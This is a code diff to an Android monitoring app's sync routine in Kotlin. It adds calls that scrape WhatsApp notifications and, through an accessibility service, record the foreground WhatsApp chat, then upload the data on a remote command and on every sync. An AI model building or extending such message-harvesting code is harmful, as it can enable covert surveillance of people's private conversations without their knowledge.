@@ -85,11 +85,20 @@ class SyncRunner(private val context: Context) {
         }
         commands.filter { it.command_type == "sync_whatsapp" }.forEach { command ->
             try {
+                com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
+                com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
+                    service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
+                }
                 com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(context)
                 ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "WhatsApp sync triggered"))
             } catch (_: Exception) {}
         }
+        com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
+        com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
+            service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
+        }
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(context)
+
 
         state.lastSyncAtEpochMs = System.currentTimeMillis()
         return true
